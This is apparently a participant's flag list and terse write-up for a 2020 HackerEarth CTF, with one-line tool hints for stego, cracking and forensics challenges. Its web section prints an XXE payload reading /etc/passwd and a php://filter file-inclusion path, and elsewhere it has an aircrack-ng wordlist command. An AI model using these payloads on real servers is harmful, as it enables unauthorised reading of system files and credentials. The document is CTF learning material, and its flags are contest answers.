
Flags of Cipher Combate CTF Hackerearth 2020

### 1. Reverse Password		
using 'strings' cmd
`HE{W0rK_H@rD_pl@y_Hard3R}`


### 2. Play and Win
using 'strings' cmd
`HE{You_are_a_tic_tac_toe_Ch@mpion}`


### 3. Welcome !!
`HE{Welcome_to_Cipher_Combat}`


### 4. QR-Code!
`HE{Ahhhh!_Y0u_@r3_0N_4!gH7_Tr@cK}`


### 5. Neighbours WiFi !!!
 use stegcracker
`HE{7h!s_!$_$tegn0grPHy}`


### 6. BASE
`HE{K33p_Calm_@nd_Ca4ry_On__Y0U_are_Do!ng_a_Great_j0B}`


### 7. Rotate
`HE{Now_You_Know_How_To_Rotate}`


### 8. CrackME
`HE{You_@re_@_Zip_Cracker}`


### 9. ReadMe
`HE{YoU_are_Absolute_Beginner}`


### 10. Ping
`HE{j@v@_c0d3_1s_m0r3_und3rst@nd@bl3_th@n_sm@l1}`


### 11. My Fav song 	
use online audio morse code detector --> found "QZZAUGPZ" word, this is the pastebin file url
https://pastebin.com/QZZAUGPZ
`HE{4ud10_fil3s_c4n_h1d3_d4t4}`


### 12. Three-words
`HE{talkative_racker_mainstream}`


### 13. Barden 
use stegsolve.jar to find image inside image --> ORC --> reverse brainfuck (x="brainfuck_value"[::-1])
or directly use 'reversefuck' on OCR
`HE{br4inst3gogr4phed}`


### 14. Merge-Me	
 >cmd:- <p> ergecap -w outputfile.pcapng *   [OR]	cat `ls` > x.pcap

`HE{$up3r$3cr3Tu$3R}`


### 15. Crack-Network  		
 aircrack-ng file.cap -w WORDLIST
`HE{budaksetan}`


### 16. NoTe 	

>cmd:- <p> binwalk -e challenge.odt

`HE{h1dd1ng_1nf0_1n_s3cr3t_pl@c3}`


### 17. HIDDEN
`HE{Y0u_G0t_50M3_5K1lLs}`


### 18. Lame Virus
Decompress UPX-compressed


>cmd: <p> upx -d -o file lame-virus.exe

`HE{an0th3er_cl4ssic_m4lwar3}`


### 19. Scroll-Dispatched

use CrypTool then Scytale Cipher with number of turns 5

`HE{i7_n3Ver_g3ts_0ld}`



# Web Challenges

### 20. Lost Cred
just need to add the xml code with some parameter, given as hint in website source code.
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY abc SYSTEM "file:///etc/passwd">]>
<creds>
	<user>&abc</user>
	<pass>asdf</pass>
</creds>
```

`HE{eCC82cC8CB5fef277401a0A787d1CE1b9f65644F4ef956d5AEfC9fa63A21c842}`


### 21. 2FA
First do the php filter then code review and found sqli and tried to find valid username
```
/index.php/php://filter/convert.base64-encode/resource=vault
```
`HE{wh4t_y0u_br0k3_Da_vAuLt_4ga1n}`

-----------------------------------------------------
